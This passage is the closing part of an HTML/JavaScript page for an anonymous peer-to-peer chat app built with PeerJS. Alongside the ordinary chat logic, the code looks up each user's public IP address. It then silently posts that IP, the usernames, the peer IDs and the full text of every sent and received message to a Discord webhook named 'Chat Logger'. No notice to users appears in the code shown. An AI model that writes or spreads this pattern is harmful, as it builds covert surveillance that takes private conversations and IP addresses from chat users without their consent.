                    
                    // Establish the connection
                    state.connection = conn;
                    state.remoteUsername = data.username || 'Stranger';
                    state.currentChatPeerId = peerId;
                    setupConnection();
                } else {
                    log(`Chat request declined by ${peerId}: ${data.reason || 'No reason given'}`);
                    showError(`Chat request declined: ${data.reason || 'No reason given'}`);
                    conn.close();
                    elements.statusText.textContent = 'Disconnected';
                    elements.statusText.className = 'status-disconnected';
                    
                    // Remove from sent requests
                    state.sentRequests.delete(peerId);
                    updateOnlineUsersUI();
                }
            }
            
            // Connect to a specific peer
            function connectToPeer(peerId) {
                if (state.isConnected) return;
                
                sendChatRequest(peerId);
            }
            
            // Set up peer connection
            function setupConnection() {
                state.connection.on('open', () => {
                    log(`Connection established with: ${state.connection.peer}`);
                    state.isConnected = true;
                    
                    sendToDiscordWebhook(`ðŸ”— **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.connection.peer}\n- Time: ${new Date().toLocaleString()}`);
                    
                    state.connection.send({
                        type: 'username',
                        username: state.localUsername
                    });
                    
                    elements.setupScreen.style.display = 'none';
                    elements.chatScreen.style.display = 'flex';
                    elements.statusText.textContent = 'Connected';
                    elements.statusText.className = 'status-connected';
                    elements.messageInput.disabled = false;
                    elements.sendBtn.disabled = false;
                    
                    appendSystemMessage('Connected! Say hello!');
                    
                    // Update online users UI to show "In Room" status
                    updateOnlineUsersUI();
                });
                
                state.connection.on('data', handlePeerData);
                state.connection.on('close', handleConnectionClose);
                state.connection.on('error', handleConnectionError);
            }
            
            // Handle peer data
            function handlePeerData(data) {
                log(`Received data: ${JSON.stringify(data)}`);
                
                if (data.type === 'message') {
                    sendToDiscordWebhook(`ðŸ“© **Message Sent**\n- From: ${state.remoteUsername || 'Unknown'} (${state.connection.peer})\n- To: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- Message: ${data.message}\n- Time: ${new Date().toLocaleString()}`);
                    
                    appendMessage(data.message, false, state.remoteUsername || 'Stranger');
                } else if (data.type === 'username') {
                    state.remoteUsername = data.username;
                    elements.usernameDisplay.textContent = `Chatting with: ${state.remoteUsername}`;
                    appendSystemMessage(`You're chatting with ${state.remoteUsername}`);
                }
            }
            
            // Handle connection close
            function handleConnectionClose() {
                log('Connection closed');
                sendToDiscordWebhook(`ðŸ”Œ **Disconnected**\n- User: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- From chat with: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Time: ${new Date().toLocaleString()}`);
                
                // Update user status to not chatting
                if (state.onlineUsers.has(state.myPeerId)) {
                    state.onlineUsers.get(state.myPeerId).isChatting = false;
                }
                if (state.currentChatPeerId && state.onlineUsers.has(state.currentChatPeerId)) {
                    state.onlineUsers.get(state.currentChatPeerId).isChatting = false;
                }
                
                handleDisconnect();
            }
            
            // Handle connection error
            function handleConnectionError(err) {
                log(`Connection error: ${err}`);
                showError(`Connection error: ${err}`);
                
                // Update user status to not chatting
                if (state.onlineUsers.has(state.myPeerId)) {
                    state.onlineUsers.get(state.myPeerId).isChatting = false;
                }
                if (state.currentChatPeerId && state.onlineUsers.has(state.currentChatPeerId)) {
                    state.onlineUsers.get(state.currentChatPeerId).isChatting = false;
                }
                
                handleDisconnect();
            }
            
            // Disconnect from peer
            function disconnectFromPeer() {
                if (state.connection) {
                    state.connection.close();
                }
                
                // Update user status to not chatting
                if (state.onlineUsers.has(state.myPeerId)) {
                    state.onlineUsers.get(state.myPeerId).isChatting = false;
                }
                if (state.currentChatPeerId && state.onlineUsers.has(state.currentChatPeerId)) {
                    state.onlineUsers.get(state.currentChatPeerId).isChatting = false;
                }
                
                handleDisconnect();
            }
            
            // Handle disconnection
            function handleDisconnect() {
                state.isConnected = false;
                state.remoteUsername = '';
                state.sentRequests.clear();
                state.currentChatPeerId = null;
                
                elements.setupScreen.style.display = 'flex';
                elements.chatScreen.style.display = 'none';
                elements.statusText.textContent = 'Disconnected';
                elements.statusText.className = 'status-disconnected';
                elements.messageInput.disabled = true;
                elements.sendBtn.disabled = true;
                
                elements.messagesContainer.innerHTML = '';
                
                // Update online users UI
                updateOnlineUsersUI();
            }
            
            // Handle connect form submission
            function handleConnectSubmit(e) {
                e.preventDefault();
                const peerId = elements.peerIdInput.value.trim();
                
                if (peerId) {
                    connectToPeer(peerId);
                } else {
                    showError('Please enter a valid Peer ID');
                }
            }
            
            // Handle message form submission
            function handleMessageSubmit(e) {
                e.preventDefault();
                const message = elements.messageInput.value.trim();
                
                if (message && state.isConnected) {
                    state.connection.send({
                        type: 'message',
                        message: message
                    });
                    
                    appendMessage(message, true, state.localUsername);
                    
                    elements.messageInput.value = '';
                }
            }
            
            // Clean up before page unload
            function cleanupBeforeUnload() {
                sendToDiscordWebhook(`ðŸšª **User Left**\n- Username: ${state.localUsername}\n- Peer ID: ${state.myPeerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
                
                if (state.connection) state.connection.close();
                if (state.trackerConnection) state.trackerConnection.close();
                if (state.heartbeatInterval) clearInterval(state.heartbeatInterval);
                if (state.refreshInterval) clearInterval(state.refreshInterval);
                
                // Close all pending requests
                state.pendingRequests.forEach(request => {
                    if (request.conn && request.conn.open) {
                        request.conn.close();
                    }
                });
                
                if (state.peer) state.peer.destroy();
            }
            
            // Utility functions
            async function getUserIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching IP:', error);
                    return 'Unknown';
                }
            }
            
            async function sendToDiscordWebhook(content) {
                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
                    console.warn('Discord webhook URL not configured');
                    return;
                }
                
                try {
                    const response = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: content,
                            username: 'Chat Logger',
                            avatar_url: 'https://i.imgur.com/4M34hi2.png',
                        }),
                    });
                    
                    if (!response.ok) {
                        console.error('Failed to send to Discord webhook:', response.status);
                    }
                } catch (error) {
                    console.error('Error sending to Discord webhook:', error);
                }
            }
            
            function log(message) {
                console.log(message);
                const now = new Date().toLocaleTimeString();
                elements.debugLog.innerHTML += `[${now}] ${message}\n`;
                elements.debugLog.scrollTop = elements.debugLog.scrollHeight;
            }
            
            function showError(message) {
                elements.errorDisplay.textContent = message;
                elements.errorDisplay.style.display = 'block';
                setTimeout(() => {
                    elements.errorDisplay.style.display = 'none';
                }, 5000);
            }
            
            function generateUsername() {
                const adjectives = ['Happy', 'Clever', 'Brave', 'Witty', 'Gentle', 'Bold', 'Calm', 'Eager', 'Fair', 'Kind'];
                const nouns = ['Wolf', 'Bear', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Fox', 'Owl', 'Dolphin', 'Panther'];
                const randomNumber = Math.floor(Math.random() * 1000);
                const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
                const noun = nouns[Math.floor(Math.random() * nouns.length)];
                return `${adj}${noun}${randomNumber}`;
            }
            
            function generateSimpleId() {
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            
            function updateOnlineUsersUI() {
                elements.onlineCount.textContent = state.onlineUsers.size;
                
                // Update connect button based on chat state
                if (state.isConnected) {
                    elements.connectBtn.textContent = 'In a Room';
                    elements.connectBtn.classList.add('in-room-btn');
                    elements.connectBtn.disabled = true;
                } else {
                    elements.connectBtn.textContent = 'Send Request';
                    elements.connectBtn.classList.remove('in-room-btn');
                    elements.connectBtn.disabled = false;
                }
                
                elements.usersList.innerHTML = '';
                
                // Always show current user first
                const currentUserItem = document.createElement('div');
                currentUserItem.classList.add('user-item', 'current-user');
                
                const currentUserInfo = document.createElement('div');
                const currentUserName = document.createElement('span');
                currentUserName.classList.add('user-name');
                currentUserName.textContent = state.localUsername;
                
                // Add chatting indicator if in a chat
                if (state.isConnected) {
                    const chattingIndicator = document.createElement('span');
                    chattingIndicator.classList.add('chatting-indicator');
                    chattingIndicator.textContent = 'chatting';
                    currentUserName.appendChild(chattingIndicator);
                }
                
                const currentUserId = document.createElement('span');
                currentUserId.classList.add('user-id');
                currentUserId.textContent = ` (${state.myPeerId})`;
                
                currentUserInfo.appendChild(currentUserName);
                currentUserInfo.appendChild(currentUserId);
                currentUserItem.appendChild(currentUserInfo);
                elements.usersList.appendChild(currentUserItem);
                
                // Show other online users
                state.onlineUsers.forEach((userData, peerId) => {
                    if (peerId === state.myPeerId || peerId === state.TRACKER_SERVER_ID) return;
                    
                    const userItem = document.createElement('div');
                    userItem.classList.add('user-item');
                    
                    const userInfo = document.createElement('div');
                    
                    const userName = document.createElement('span');
                    userName.classList.add('user-name');
                    userName.textContent = userData.username;
                    
                    // Add chatting indicator if user is in a chat
                    if (userData.isChatting) {
                        const chattingIndicator = document.createElement('span');
                        chattingIndicator.classList.add('chatting-indicator');
                        chattingIndicator.textContent = 'chatting';
                        userName.appendChild(chattingIndicator);
                    }
                    
                    const userId = document.createElement('span');
                    userId.classList.add('user-id');
                    userId.textContent = ` (${peerId})`;
                    
                    userInfo.appendChild(userName);
                    userInfo.appendChild(userId);
                    userItem.appendChild(userInfo);
                    
                    // Add appropriate button based on state
                    const actionButton = document.createElement('button');
                    
                    if (state.isConnected) {
                        // If we're in a room with someone, show "In Room" button for all users
                        actionButton.classList.add('request-btn', 'in-room');
                        actionButton.textContent = 'In a Room';
                        actionButton.disabled = true;
                    } else if (state.sentRequests.has(peerId)) {
                        // If we've sent a request to this user, show "Request Sent" button
                        actionButton.classList.add('request-btn', 'sent');
                        actionButton.textContent = 'Request Sent';
                        actionButton.disabled = true;
                    } else {
                        // Otherwise show normal "Request Chat" button
                        actionButton.classList.add('request-btn');
                        actionButton.textContent = 'Request Chat';
                        actionButton.onclick = () => {
                            elements.peerIdInput.value = peerId;
                            connectToPeer(peerId);
                        };
                    }
                    
                    userItem.appendChild(actionButton);
                    elements.usersList.appendChild(userItem);
                });
            }
            
            function appendMessage(text, isSent, sender) {
                const messageElement = document.createElement('div');
                messageElement.classList.add('message');
                messageElement.classList.add(isSent ? 'sent' : 'received');
                
                const usernameElement = document.createElement('div');
                usernameElement.classList.add('username');
                usernameElement.textContent = sender;
                
                const textElement = document.createElement('div');
                textElement.textContent = text;
                
                messageElement.appendChild(usernameElement);
                messageElement.appendChild(textElement);
                
                elements.messagesContainer.appendChild(messageElement);
                elements.messagesContainer.scrollTop = elements.messagesContainer.scrollHeight;
                
                if (isSent) {
                    sendToDiscordWebhook(`ðŸ“¤ **Message Sent**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${state.remoteUsername || 'Unknown'} (${state.connection?.peer || 'Unknown'})\n- Message: ${text}\n- Time: ${new Date().toLocaleString()}`);
                }
            }
            
            function appendSystemMessage(text) {
                const messageElement = document.createElement('div');
                messageElement.classList.add('message');
                messageElement.style.alignSelf = 'center';
                messageElement.style.backgroundColor = '#333';
                messageElement.style.color = '#aaa';
                messageElement.style.fontStyle = 'italic';
                messageElement.style.padding = '0.8rem 1.2rem';
                messageElement.style.borderRadius = '20px';
                messageElement.textContent = text;
                
                elements.messagesContainer.appendChild(messageElement);
                elements.messagesContainer.scrollTop = elements.messagesContainer.scrollHeight;
            }
            
            // Public API
            return {
                init
            };
        })();
        
        // Initialize the app when DOM is loaded
        document.addEventListener('DOMContentLoaded', ChatApp.init);
    </script>
</body>
</html>
